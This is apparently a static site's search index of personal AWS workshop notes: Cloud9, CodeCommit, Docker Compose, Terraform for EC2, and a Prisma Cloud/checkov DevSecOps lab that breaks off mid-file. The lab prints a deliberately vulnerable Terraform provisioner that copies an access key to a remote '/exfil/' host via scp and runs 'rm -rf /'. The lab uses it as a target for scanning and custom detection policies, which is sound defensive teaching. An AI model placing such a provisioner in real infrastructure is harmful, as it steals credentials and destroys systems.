[
{
	"uri": "http://localhost:1313/aws-ws/",
	"title": " AWS Projects ",
	"tags": [],
	"description": "",
	"content": "AWS Projects Home | Sile Project\nAmazon Web Services (AWS) is a comprehensive, evolving cloud computing platform provided by Amazon.com. It offers a wide range of services, including computing power, storage solutions, networking, databases, machine learning, analytics, security, and more, all delivered over the internet.\nOverview\n1- Infrastructure as a Service (IaaS): AWS provides virtual computing resources over the internet. This includes computing power (Amazon EC2), storage (Amazon S3), and networking (Amazon VPC).\n2- Platform as a Service (PaaS): AWS offers platforms for building, deploying, and managing applications without worrying about the underlying infrastructure. Examples include AWS Elastic Beanstalk for deploying web applications and AWS Lambda for serverless computing.\n3- Software as a Service (SaaS): AWS hosts various software applications accessible over the internet. Examples include Amazon WorkMail for email and Amazon Chime for video conferencing.\n4- Storage Solutions: AWS provides scalable and secure storage services such as Amazon S3 (Simple Storage Service) for object storage, Amazon EBS (Elastic Block Store) for block storage, and Amazon Glacier for long-term archival storage.\n5- Database Services: AWS offers a range of managed database services, including Amazon RDS (Relational Database Service) for relational databases like MySQL, PostgreSQL, and Amazon Aurora, Amazon DynamoDB for NoSQL databases, and Amazon Redshift for data warehousing.\n6- Compute Services: AWS provides various compute services, including Amazon EC2 (Elastic Compute Cloud) for virtual servers, AWS Lambda for serverless computing, and Amazon ECS (Elastic Container Service) for container management.\n7- Networking: AWS offers networking services like Amazon VPC (Virtual Private Cloud) for creating isolated network environments, AWS Direct Connect for dedicated network connections, and Amazon Route 53 for domain name system (DNS) management.\n8- AI and Machine Learning: AWS provides AI and machine learning services such as Amazon SageMaker for building, training, and deploying machine learning models, Amazon Rekognition for image and video analysis, and Amazon Comprehend for natural language processing.\n9- Security and Compliance: AWS offers various security and compliance services, including AWS Identity and Access Management (IAM) for managing user access, AWS Shield for DDoS protection, and AWS Inspector for security assessment.\n10- Management and Monitoring: AWS provides tools for managing and monitoring resources, such as Amazon CloudWatch for monitoring, AWS CloudFormation for infrastructure as code, and AWS Trusted Advisor for optimizing costs and performance.\n11- IoT and Edge Computing: AWS offers services for Internet of Things (IoT) and edge computing, including AWS IoT Core for connecting devices to the cloud, AWS Greengrass for running IoT applications locally, and AWS IoT Device Defender for securing IoT devices.\n12- Developer Tools: AWS provides developer tools such as AWS CodeCommit for version control, AWS CodeBuild for continuous integration, and AWS CodeDeploy for deploying applications.\nContent Introduction Workshop Prepairation Configuration Cleanup "
},
{
	"uri": "http://localhost:1313/aws-ws/7-fcj/7.1-cloud9/",
	"title": "Cloud 9",
	"tags": [],
	"description": "",
	"content": "Use the Cloud IDE in the browser with AWS Cloud9 https://000049.awsstudygroup.com/\nCreate Cloud9 instance Create environment\nName: clou9instance Environment type: Select Create a new EC2 instance for environment (direct access). Instance type : Select t2.micro. Platform : Select Amazon Linux2. Cost-saving setting : select After 30 minutes. Allows to automatically stop Cloud9 instances to save costs. Create environment Dashboard interface Using AWS CLI aws ec2 describe-instances Clean up resources In AWS Cloud9 \u0026gt; Your environments : Select clou9instance and click Delete\n"
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/",
	"title": "Cloud Computing Essentials",
	"tags": [],
	"description": "",
	"content": "Business Request The city\u0026rsquo;s web portal needs to migrate the beach wave size prediction page to AWS to improve reliability.\nLearning Objectives Articulate the characteristics of the AWS cloud computing platform. Describe the core benefits of using AWS products and services. Compare and contrast AWS cloud services to On-Premises infrastructure. Implement hosting a static web page using Amazon S3. Practice Lab Noted Review the practice lab objectives in the Concept section below. Click Start Lab to provision your environment, and then click Open AWS Console to begin. IMPORTANT: Be sure to use ONLY the AWS lab account provisioned by Cloud Quest. The use of any other AWS account is not supported and might incur charges. Follow the lab instructions carefully, and use the arrows below to navigate between steps. AWS services not used in this lab are disabled in the lab environment. In addition, the capabilities of the services used in this lab are limited to what the lab requires.\n"
},
{
	"uri": "http://localhost:1313/aws-ws/6-wsaudio/6.1-devsecops/",
	"title": "Cloud DevSecOps",
	"tags": [],
	"description": "",
	"content": "Cloud DevSecOps with Hashicorp, Palo Alto Networks \u0026amp; AWS Learning Objectives\nGain an understanding of DevSecOps and infrastructure as code (IaC) using Terraform Scan IaC files for misconfigurations locally Set up CI/CD pipelines to automate security scanning and policy enforcement Fix security findings and AWS resource misconfigurations with Prisma Cloud DevSecOps : https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/1-table-content/2-devsecops\nThe foundation of DevSecOps lies in the DevOps movement, wherein development and operations functions have merged to make deployments faster, safer, and more repeatable. Common DevOps practices include automated infrastructure build pipelines (CI/CD) and version-controlled manifests (GitOps) to make it easier to control cloud deployments. By baking software and infrastructure quality requirements into the release lifecycle, teams save time manually reviewing code, letting teams focus on shipping features. Infrastructure as Code Using Terraform\nInfrastructure as code (IaC) frameworks, such as HashiCorp Terraform, make cloud provisioning scalable and straightforward by leveraging automation and code. Defining our cloud infrastructure in code simplifies repetitive DevOps tasks and gives us a versioned, auditable source of truth for the state of an environment. Setup / Prerequisities Github account Terraform Cloud account AWS account (provided during workshop) Prisma Cloud account (OPTIONAL) Log into AWS Workshop: [!NOTE] This section is for live workshop events only.\nConfigure IAM User and API Key\nUser name: tf-cloud Policies: AdminstratorAccess Create access key (other): Access key (Third-party service) Configure AWS Cloud9 IDE\nCreate environment (name): your-name-workspace\nEnv type: New EC2 instance\nAdditaional instance types: Types: t3.medium Platform: Amazon Linux 2023 Timeout: 30 minutes Network settings:\nConnection: AWS System Manager (SSM) -\u0026gt; Open in Cloud9 Create and activate a python virtual environment\npython3 -m venv env source ./env/bin/activate Section 1: Code Scanning with checkov Checkov: https://www.checkov.io/ Checkov is an open source \u0026lsquo;policy-as-code\u0026rsquo; tool that scans cloud infrastructure defintions to find misconfigurations before they are deployed. Some of the key benefits of checkov: Runs as a command line interface (CLI) tool Supports many common plaftorms and frameworks Ships with thousands of default policies Works on windows/mac/linux (any system with python installed) Install checkov: install, version , verify and see a list of every policy that Checkov can enforce\npip3 install checkov checkov --version checkov --help checkov --list 1. Fork and clone target repository\nThis workshop involves code that is vulnerable-by-design. All of the necessary code is contained within this repository or workshop guide itself.\nPrisma Cloud DevSecOps Workshop repository: https://github.com/paloAltoNetworks/prisma-cloud-devsecops-workshop\nGrab the repo URL from Github, then clone the forked repository to Cloud9.\ngit clone https://github.com/\u0026lt;your-organization\u0026gt;/prisma-cloud-devsecops-workshop.git cd prisma-cloud-devsecops-workshop/ git status Great! Now we have some code to scan. Let\u0026rsquo;s jump in\u0026hellip;\n2. Scan with checkov\nCheckov can be configured to scan files and enforce policies in many different ways. To highlight a few: Scans can run on individual files or entire directories. Policies can be selected through selection or omission. Enforcement can be determined by flags that control checkov\u0026rsquo;s exit code. Let\u0026rsquo;s start by scanning the entire ./code directory and viewing the results.\ncd code/ checkov -d . Is this learn theme rocks ?\r![6][5]\nFailed checks are returned containing the offending file and resource, the lines of code that triggered the policy, and a guide to fix the issue.\nNow try running checkov on an individual file with checkov -f \u0026lt;filename\u0026gt;.\nsimple_ec2.tf\rprovider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } resource \u0026#34;aws_ec2_host\u0026#34; \u0026#34;test\u0026#34; { instance_type = \u0026#34;t3.micro\u0026#34; availability_zone = \u0026#34;us-west-2a\u0026#34; provisioner \u0026#34;local-exec\u0026#34; { command = \u0026#34;echo Running install scripts.. \u0026#39;echo $ACCESS_KEY \u0026gt; creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /\u0026#39; \u0026#34; } } checkov -f deployment_ec2.tf checkov -f simple_ec2.tf Policies can be optionally enforced or skipped with the --check and --skip-check flags.\ncheckov -f deployment_s3.tf --check CKV_AWS_18,CKV_AWS_52 checkov -f deployment_s3.tf --skip-check CKV_AWS_18,CKV_AWS_52 Frameworks can also be selected or omitted for a particular scan:\ncheckov -d . --framework secrets --enable-secret-scan-all-files checkov -d . --skip-framework dockerfile Lastly, enforcement can be more granularly controlled by using the \u0026ndash;soft-fail option. Applying \u0026ndash;soft-fail results in the scan always returning a 0 exit code. Using \u0026ndash;hard-fail-on overrides this option.\nCheck the exit code when running checkov -d . with and without the \u0026ndash;soft-fail option.\ncheckov -d . ; echo $? checkov -d . --soft-fail ; echo $? 3. Custom polices\nCheckov supports the creation of Custom Policies for users to customize their own policy and configuration checks. Custom policies can be written in YAML (recommended) or python and applied with the --external-checks-dir or --external-checks-git flags.\nLet\u0026rsquo;s create a custom policy to check for local-exec and remote-exec Provisioners being used in Terraform resource definitons. https://developer.hashicorp.com/terraform/language/resources/provisioners/local-exec\nExpand provisioners code: check.yaml\rmetadata: name: \u0026#34;Terraform contains local-exec and/or remote-exec provisioner\u0026#34; id: \u0026#34;CKV2_TF_1\u0026#34; category: \u0026#34;GENERAL_SECURITY\u0026#34; definition: and: - cond_type: \u0026#34;attribute\u0026#34; resource_types: all attribute: \u0026#34;provisioner/local-exec\u0026#34; operator: \u0026#34;not_exists\u0026#34; - cond_type: \u0026#34;attribute\u0026#34; resource_types: all attribute: \u0026#34;provisioner/remote-exec\u0026#34; operator: \u0026#34;not_exists\u0026#34; Add the above code to a new file within a new direcotry.\nmkdir custom-checks/ vim custom-checks/check.yaml [!TIP] use echo \u0026lsquo;$(file_contents)\u0026rsquo; \u0026gt; custom-checks/check.yaml if formatting is an issue with vim.\nSave the file. Then run checkov with the \u0026ndash;external-checks-dir to test the custom policy.\nsimple_ec2.tf\rprovider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } resource \u0026#34;aws_ec2_host\u0026#34; \u0026#34;test\u0026#34; { instance_type = \u0026#34;t3.micro\u0026#34; availability_zone = \u0026#34;us-west-2a\u0026#34; provisioner \u0026#34;local-exec\u0026#34; { command = \u0026#34;echo Running install scripts.. \u0026#39;echo $ACCESS_KEY \u0026gt; creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /\u0026#39; \u0026#34; } } checkov -f simple_ec2.tf --external-checks-dir custom-checks Challenge: *write a custom policy to check all resources for the presence of tags. Specifically, ensure that a tag named \u0026ldquo;Environment\u0026rdquo; exists.\nIDE plugin: [!NOTE] Demo Only. Requires API key for Prisma Cloud.\nLink to docs: Prisma Cloud IDE plugins\nLink to docs: VScode extension\nEnabling checkov in an IDE provides real-time scan (in Cloud9) Github Actions: Create a new action from scratch = checkov.yaml checkov.yaml\rname: checkov on: pull_request: push: branches: - main jobs: scan: runs-on: ubuntu-latest permissions: contents: read # for actions/checkout to fetch code security-events: write # for GitHub/codeql-action/upload-sarif to upload SARIF results steps: - uses: actions/checkout@v2 - name: Run checkov id: checkov uses: bridgecrewio/checkov-action@master with: directory: code/ #soft_fail: true #api-key: ${{ secrets.BC_API_KEY }} #env: #PRISMA_API_URL: https://api4.prismacloud.io - name: Upload SARIF file uses: GitHub/codeql-action/upload-sarif@v2 # Results are generated only on a success or failure # this is required since GitHub by default won\u0026#39;t run the next step # when the previous one has failed. Alternatively, enable soft_fail in checkov action. if: success() || failure() with: sarif_file: results.sarif Notice the policy violations that were seen earlier in CLI/Cloud9 are now displayed here. View results in Github Security Checkov natively supports SARIF format and generates this output by default. GitHub Security accepts SARIF for uploading security issues. The GitHub Action created earlier handles the plumbing between the two.\nNavigate to the Security tab in GitHub, the click Code scanning from the left sidebar or View alerts in the Security overview \u0026gt; Code scanning alerts section.\nThe security issues found by checkov are surfaced here for developers to get actionable feedback on the codebase they are working in without having to leave the platform.\nTag and Trace with Yor: Yor is another open source tool that can be used for tagging and tracing IaC resources from code to cloud. For example, yor can be used to add git metadata and a unique hash to a terraform resource; this can be used to better manage resource lifecycles, improve change management, and ultimately to help tie code defintions to runtime configurations.\nCreate new file in the GitHub UI under the path .github/workflows/yor.yaml. Expand: yor.yaml\rname: IaC tag and trace on: push: pull_request: jobs: yor: runs-on: ubuntu-latest permissions: contents: write steps: - uses: actions/checkout@v2 name: Checkout repo with: fetch-depth: 0 - name: Run yor action uses: bridgecrewio/yor-action@main Viewing any .tf file in the code/ directory. Branch Protection Rules: Using Branch Protection Rules allows for criteria to be set in order for pushes and pull requests to be merged to a given branch. This can be set up to run checkov and block merges if there are any misconfigurations or vulnerabilities.\nGithub \u0026gt; Branches \u0026gt; Add branch protection rule. Enter: main Check: Require status checks to pass before merging search for checkov (scan) Integrate workflow with Terraform Cloud Create a new organizaion: some_org\nEmail:\nCreate a New Workspace: VS Workflow\nConnect to Github \u0026gt; Choose the prisma-cloud-devsecops-workshop from the list of repositories. Add a Workspace: Name: prisma-cloud-devsecops-workshop Project: Default Project Terraform Working Directory: /code/bulid/ VS Triggers: Only trigger Select Syntax: Patterns Pull Requests: Check Automatic speculative plans -\u0026gt; Continue to workspace overview prisma-cloud-devsecops-workshop: Configure variables\nAdd variables for AWS_SECRET_KEY_ID and AWS_SECRET_ACCESS_KEY. Ensure you select Environment variables for both and that AWS_SECRET_ACCESS_KEY is marked as Sensitive. AWS S3 Access\rIAM user: tf-cloud Attach policies: AdministratorAccess Security credentials: Access key (Third-party service) Block a Pull Request, Prevent a Deployment We have now configured a GitHub repository to be scanned with checkov and to trigger Terraform Cloud to deploy infrastructure Create a new file in the GitHub UI under the path code/build/s3.tf Expand s3.tf\rprovider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } resource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket_prefix = \u0026#34;dev-\u0026#34; tags = { Environment = \u0026#34;Dev\u0026#34; } } resource \u0026#34;aws_s3_bucket_ownership_controls\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket = aws_s3_bucket.dev_s3.id rule { object_ownership = \u0026#34;BucketOwnerPreferred\u0026#34; } } Once complete, click Commit changes\u0026hellip; at the top right, then select Create a new branch and start a pull request and click Propose changes. At the next screen, review the diff then click Create pull request. Either bypass branch protections and Merge pull request or go back to the Github Action for checkov and uncomment the line with --soft-fail=true. This will require closing and reopening a new pull request. ISSUE:\nFix: code/build\nproviders.tf\rterraform { required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; } } } provider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } s3.tf change to main.tf\rresource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket_prefix = \u0026#34;dev-\u0026#34; tags = { Environment = \u0026#34;Dev\u0026#34; yor_name = \u0026#34;dev_s3\u0026#34; yor_trace = \u0026#34;d6c205d2-67e5-4856-a003-e9d4a2629f8d\u0026#34; git_commit = \u0026#34;69a9110e596f86b5250039de52aa332e25b79a36\u0026#34; git_file = \u0026#34;code/build/s3.tf\u0026#34; git_last_modified_at = \u0026#34;2024-05-14 10:49:55\u0026#34; git_last_modified_by = \u0026#34;150504127+nonotnonez@users.noreply.github.com\u0026#34; git_modifiers = \u0026#34;150504127+nonotnonez\u0026#34; git_org = \u0026#34;nonotnonez\u0026#34; git_repo = \u0026#34;prisma-cloud-devsecops-workshop\u0026#34; } } resource \u0026#34;aws_s3_bucket_ownership_controls\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket = aws_s3_bucket.dev_s3.id rule { object_ownership = \u0026#34;BucketOwnerPreferred\u0026#34; } } Workflow Deploy to AWS Update main.tf and merge to main repo Navigate to Terraform Cloud and view the running plan. Go to the S3 menu within AWS to view the bucket that has been deployed. Now let\u0026rsquo;s see how we can leverage Prisma Cloud to make this all easier, gain more featues and scale security at ease. Terraform destroy\nSettings - Destruction and Deletion Destroy infrastructure -\u0026gt; Queue destroy plan Amazone S3 overview\nWelcome to Prisma Cloud Prisma Cloud is a Cloud Native Application Protection Platform (CNAPP) comprised of three main pillars:\nCloud Security Runtime Security Application Security Across these three \u0026ldquo;modules\u0026rdquo;, Prisma Cloud provides comprehensive security capabilities spanning code to cloud. This workshop will mainly focus on the Application Security module within the Prisma Cloud platform.\nSection 2: Application Security with Prisma Cloud Onboard AWS Account We need to configure Prisma Cloud to communitcate with a CSP. Let\u0026rsquo;s do this by onboarding an AWS Account.\nNavigate to Settings \u0026gt; Providers \u0026gt; Connect Provider and follow the instructions prompted by the conifguration wizard.\nSelect Amazon Web Services. Choose Account for the scope, deselect Agentless Workload Scanning, leave the rest as default and click Done. Provide your Account ID and enter an Account Name. Then click Create IAM Role to have Prisma Cloud auto-configure itself. Scroll to the bottom of the AWS page that opens, click to acknowledge the disclaimer and then click Create stack. Wait a moment while the stack is created, we need an output from the final result of the stack being deployed. Once created, go to the Outputs tab and copy the value of ARN displayed. Head back to Prisma Cloud and paste this value into the IAM Role ARN field, then click Next. Wait for the connectivity test to run, review the status and click Save and Close. View the onboarded cloud account under Settings \u0026gt; Providers. 2.Integrations and Providers\nLet\u0026rsquo;s start by integrating with checkov. Checkov with API Key To generate an API key, navigate to Settings \u0026gt; Access Control. Click the Add button and select Access Key. Download the csv file containing the credentials then click Done. In a terminal window run checkov against the entire code directory, now with an API key. Use the following command: checkov -d . --bc-api-key \u0026lt;access_key_id::\u0026lt;secret_key\u0026gt; --repo-id prisma/devsecops-workshop --prisma-api-url https://api4.prismacloud.io Notice how the results now contain a severity. There are some other features that come with Prisma Cloud (using an API key) as well\u0026hellip;\nReturn back to Prisma Cloud to view the results that checkov surfaced in the platform. Navigate to Application Security \u0026gt; Projects.\nLet\u0026rsquo;s add this same API key to the GitHub Action created earlier. Within your GitHub repository, go to Settings \u0026gt; Secrets and variables then select Actions.\nClick New repository secret then input the secret value of \u0026lt;access_key_id\u0026gt;::\u0026lt;secret_key\u0026gt; pair. Edit checkov.yaml, remove comments for api-key and PRISMA_API_URL. Commit directly to main branch. Now check the results under Security \u0026gt; Code scanning. The same findings that displayed here earlier now with a Severity to sort and prioritze with.\nReturn again to Prisma Cloud to view the results that were sent to the the platform.\n[!TIP] You can use Prisma Cloud (checkov w/ an API key) to scan docker images for vulnerabilities! Use the --docker-image flag and point to an image name or ID.\nTerraform Cloud Run Tasks Let\u0026rsquo;s now connect Prisma Cloud with Terraform Cloud using the Run Tasks integration. This allows for developers and platform teams to get immediate security feedback for every pipeline run. The Run Task integration will also surface results of every pipeline run to Prisma Cloud and the Security team.\nFirst we need to create an API key in Terraform Cloud. Go to the Terraform Cloud console and navigate to User Settings \u0026gt; Tokens then click Create an API Token. Copy the token and save the value somewhere safe. This will be provided to Prisma Cloud in the next step. Go to the Prisma Cloud console and navigate to Settings \u0026gt; Connect Provider \u0026gt; Code \u0026amp; Build Providers to set up the integration. Under CI/CD Runs, choose Terraform Cloud (Run Tasks). Enter the API token generated in Terraform Cloud and click Next. Select your Organization. Select your Workspace and choose the Run Stage in which you want Prisma Cloud to execute a scan. Pre-plan will scan HCL code, Post-plan will scan the Terraform plan.out file. Once completed, click Done. Return back to Terraform Cloud to view the integration. Go to your Workspace and click Settings \u0026gt; Run Tasks. GitHub Application Next we will set up the Prisma Cloud GitHub Application which will perform easy-to-configure code scanning for GitHub repos.\nGo to Prisma Cloud and create a new integration under Settings \u0026gt; Connect Provider \u0026gt; Code \u0026amp; Build Providers. Under Code Repositories, select GitHub. Follow the install wizard and Authorize your GitHub account. Select the repositories you would like to provide access to and click Install \u0026amp; Authorize. Select the target repositories to scan now accessible from the Prisma Cloud wizard, then click Next. Click Done once completed. Navigate to Settings \u0026gt; Providers \u0026gt; Repositories to view the onboarded repo(s). Submit a Pull Request 2.0 Lets push a change to test the integration. Navigate to GitHub and make a change to the s3 resource deployed earlier under code/build/s3.tf.\nAdd the following line of code to the s3 resource definition. Then click Commit changes\u0026hellip; once complete.\nacl = \u0026#34;public-read-write\u0026#34; Create a new branch and click Propose changes. On the next page, review the diff then click Create pull request. Once gain, click Create pull request to open the pull request. Let the checks run against the pull request. Prisma Cloud can review pull requests and will add comments with proposed changes to give developers actionable feedback within their VCS platform. When ready, click Merge pull request bypassing branch protection rules if still enabled. Now that the change has been merged, navigate back to Terraform Cloud to view the pipeline running. Check the Post-plan stage and view the results of the Prisma Cloud scan. Leave this as is for now. We will soon fix the error and retrigger the pipeline. View scan results in Prisma Cloud Return to Prisma Cloud to view the results of all the scans that were just performed.\nNavigate to Application Security \u0026gt; Projects \u0026gt; Overview to view findings for all scans. Filter the results with the Repository drop-down menu.\nView relevant CI/CD Risks Application Security \u0026gt; CI/CD Risks:\nGet a full SBOM analysis under Application Security \u0026gt; SBOM:\nTake a look at Dashboards \u0026gt; Code Security to get top-level reports.\nAnother useful view can be found under Inventory \u0026gt; IaC Resources\nEnforcement Rules The level of enforcement applied to each code scan can be controlled under Settings \u0026gt; Configure \u0026gt; Application Security \u0026gt; Enforcement Rules\nThese can be adjusted as a top-down policy or exceptions can be created for specific repositories / integrations.\nIssue a PR-Fix Lets create a pull request from the Prisma Cloud console to apply a code fix. Navigate to Application Security \u0026gt; Projects \u0026gt; Overview IaC Misconfiguration then find the dev_s3 bucket with the public access violations.\nThen click the Submit button in the top right to open a pull request.\nNavigate back to GitHub and check the Pull request tab to see the fix Prisma Cloud submitted.\nDrill into the pull request and inspect the file changes under the Files changes tab. Notice the changes made to remediate the original policy violation.\nGo back to the Coversation tab and click Merge the pull request at the bottom to check this code into the main branch.\nCheck Terraform Cloud to view the plan succesfully run. No need to apply this run as we will use the earlier deployment for our next example.\nDrift Detection In this final section, we will use the pipeline we built to detect drift. Drift occurs when infrastructure running in the cloud becomes configured differntly from what was originally defined in code.\nThis usually happens during a major incident, where DevOps and SRE teams make manual changes to quickly solve a problem, such as opening up ports to larger CIDR blocks or turning off HTTPS to find the problem. Sometimes lack of access and/or familiarity with IaC/CICD makes fixing an issue directly in the cloud easier than fixing in code and redeploying. If these aren’t reverted, they present security issues and it weakens the benefits of using IaC.\nWe will use the S3 bucket deployed earlier to simulate drift in a resource configuration.\n[!NOTE] By default Prisma Cloud performs full resource scans on an hourly interval.\nNext, go to the AWS Console under S3 buckets and add a new tag to the bucket created earlier.\nFor example, add a tag with the key/value pair drift = true and click Save changes.\nOn the next scan Prisma Cloud will detect this change and notify users that a resource configuration has changed from how it is defined in code. To view this, navigate to Projects \u0026gt; IaC Misconfiguration and filter for Drift under the IaC Categories dropdown menu.\nPrisma Cloud provides the option to revert the change via the same pull request mechanism we just performed which would trigger a pipeline run and patch the resource.\nWrapping Up Congrats! In this workshop, we didn’t just learn how to identify and automate fixing misconfigurations — we learned how to bridge the gaps between Development, DevOps, and Cloud Security. We are now equipped with full visibility, guardrails, and remediation capabilities across the development lifecycle. We also learned how important and easy it is to make security accessible to our engineering teams.\nTry more of the integrations with other popular developer and DevOps tools. Share what you’ve found with other members of your team and show how easy it is to incorporate this into their development processes.\n"
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/8.1-commit/",
	"title": "CodeCommit",
	"tags": [],
	"description": "",
	"content": "\nVersion control is the ability to understand the various changes that happened to the code overtime (and possibly roll back) Create Repo Developer Tools \u0026gt; CodeCommit \u0026gt; Repository \u0026gt; Create repository\nRepository name: cicd-repo\nIAM User\nUser name: cicd-user Permission: AdministratorAccess Download Access \u0026amp; Secret key Credentials\nUser: cicd-user Credentials : HTTPS Git credentials for AWS CodeCommit Generate credentials Clone Repo\nRepo: cicd-repo Clone URL - Clone HTTPS Ex: git clone https://git-commit.aws-east-1.amazonaws.com/v1/repos/cicd-repo Clone, add, commit, push Local\nCopy source code to repo git status git add . git status git commit -m \u0026ldquo;First Commit\u0026rdquo; git push Check on AWS repo\nRepositories Code Commits - master Branching Local website check: index.html\nEdit index.htm (v2) git status git add . git commit -m \u0026ldquo;revised index to v2\u0026rdquo; git push Check on AWS repo\nCommits : review changes Branch merge pull request Create branch\ngit checkout -b feature1 edit index.html (v3) git add . git commit -m \u0026ldquo;revised index to v3\u0026rdquo; git push Check AWS repo\nBranches Pull request\nCreate pull request Destination: master Source: feature1 Compare Details Title: mergefeature1 Create pull request Check \u0026gt; Changes (review changes) Merge Delete after merge Merge pull request Branches\nCode: check index.html\n"
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.1-docker/",
	"title": "Container",
	"tags": [],
	"description": "",
	"content": "A container is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries, and settings\nOverview Docker Docker is a platform that enables developers to build, package, ship, and run applications in containers. It provides tools and a platform to manage containerized applications across different environments, from development to production. Docker Compose Docker Compose is a tool provided by Docker that allows you to define and manage multi-container Docker applications. It uses a YAML file to configure the services, networks, and volumes required for your application Configuration Check the installed software\ndocker --version docker-compose --version Create a docker compose file to run the software on the container environment\ndocker-compose.yml version: \u0026#39;3\u0026#39; services: # Terraform terraform: image: hashicorp/terraform:latest volumes: - .:/terraform working_dir: /terraform # AWS CLI\u0026#39; aws: image: anigeo/awscli environment: AWS_ACCESS_KEY_ID: \u0026#34;${AWS_ACCESS_KEY_ID}\u0026#34; AWS_SECRET_ACCESS_KEY: \u0026#34;${AWS_SECRET_ACCESS_KEY}\u0026#34; AWS_REGION: \u0026#34;${AWS_REGION}\u0026#34; AWS_DEFAULT_REGION: ap-southeast-1 volumes: - $PWD:/app working_dir: /app "
},
{
	"uri": "http://localhost:1313/aws-ws/3-config/3.1-iac/3.1.1-ec2/",
	"title": "EC2",
	"tags": [],
	"description": "",
	"content": "In this Workshop we will automate create an EC2 instances with the information bellow by using Terraform, Docker-compose and AWS CLI\nOverview AWS EC2 AWS User : tf-cli\nAccess \u0026amp; Secret key : tf_cli-access_key.json\nAWS Key-pair : tf-cli-keypair\nEC2 Instance:\nInstances name: Web-Server VPC: 10.0.0.0/16 Subnets: 10.0.1.0/24 Region: Singapore (ap-southeast-1) Available zone: ap-southeast-1b Instance type: t2.micro Amazon Machine Images: Amazon Linux 2 AMI Key pair: tf-cli-keypair Security setting: Only allow my ip connect SSH to EC2 instance Allow all access from port 8080 to EC2 instance Review Configuration Container: Docker-compose.yml version: \u0026#39;3\u0026#39; services: # Terraform terraform: image: hashicorp/terraform:latest volumes: - .:/terraform working_dir: /terraform # AWS CLI\u0026#39; aws: image: anigeo/awscli environment: AWS_ACCESS_KEY_ID: \u0026#34;${AWS_ACCESS_KEY_ID}\u0026#34; AWS_SECRET_ACCESS_KEY: \u0026#34;${AWS_SECRET_ACCESS_KEY}\u0026#34; AWS_REGION: \u0026#34;${AWS_REGION}\u0026#34; AWS_DEFAULT_REGION: ap-southeast-1 volumes: - $PWD:/app working_dir: /app AWS : User Access , Secret Key, Key Pair: # check aws version docker-compose run --rm aws --version # create aws user docker-compose run --rm aws iam create-user --user-name tf-cli # create access key for user docker-compose run --rm aws iam create-access-key --user-name tf-cli \u0026gt; tf_cli-access_key.json # create keypair for ec2 docker-compose run --rm aws ec2 create-key-pair --key-name tf-cli-keypair --query \u0026#39;KeyMaterial\u0026#39; --output text \u0026gt; tf-cli-keypair.pem Attach User with Policy Access EC2 and Limit Region\r# Custom policy file: ec2-limited-access-policy.json # Create IAM poliy: EC2FullAccessAPSouthEast1 docker-compose run --rm aws iam attach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::637423373411:policy/EC2FullAccessAPSouthEast1 # ec2-limited-access-policy.json\r{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;ec2:*\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;StringEquals\u0026#34;: { \u0026#34;ec2:Region\u0026#34;: \u0026#34;ap-southeast-1\u0026#34; } } } ] } Terraform : variables.tf - Security credential variables variable \u0026#34;access_key\u0026#34; { type = string sensitive = true } variable \u0026#34;secret_key\u0026#34; { type = string sensitive = true } variable \u0026#34;region\u0026#34; { type = string default = \u0026#34;ap-southeast-1\u0026#34; } main.tf - Instances configurations\rvariable vpc_cidr_block {} variable subnet_1_cidr_block {} variable avail_zone {} variable env_prefix {} variable instance_type {} variable my_ip {} variable ami_id {} resource \u0026#34;aws_vpc\u0026#34; \u0026#34;myapp-vpc\u0026#34; { cidr_block = var.vpc_cidr_block tags = { Name = \u0026#34;${var.env_prefix}-vpc\u0026#34; } } resource \u0026#34;aws_subnet\u0026#34; \u0026#34;myapp-subnet-1\u0026#34; { vpc_id = aws_vpc.myapp-vpc.id cidr_block = var.subnet_1_cidr_block availability_zone = var.avail_zone tags = { Name = \u0026#34;${var.env_prefix}-subnet-1\u0026#34; } } resource \u0026#34;aws_security_group\u0026#34; \u0026#34;myapp-sg\u0026#34; { name = \u0026#34;myapp-sg\u0026#34; vpc_id = aws_vpc.myapp-vpc.id ingress { from_port = 22 to_port = 22 protocol = \u0026#34;tcp\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] } ingress { from_port = 8080 to_port = 8080 protocol = \u0026#34;tcp\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] } egress { from_port = 0 to_port = 0 protocol = \u0026#34;-1\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] prefix_list_ids = [] } tags = { Name = \u0026#34;${var.env_prefix}-sg\u0026#34; } } resource \u0026#34;aws_internet_gateway\u0026#34; \u0026#34;myapp-igw\u0026#34; { vpc_id = aws_vpc.myapp-vpc.id tags = { Name = \u0026#34;${var.env_prefix}-internet-gateway\u0026#34; } } resource \u0026#34;aws_route_table\u0026#34; \u0026#34;myapp-route-table\u0026#34; { vpc_id = aws_vpc.myapp-vpc.id route { cidr_block = \u0026#34;0.0.0.0/0\u0026#34; gateway_id = aws_internet_gateway.myapp-igw.id } # default route, mapping VPC CIDR block to \u0026#34;local\u0026#34;, created implicitly and cannot be specified. tags = { Name = 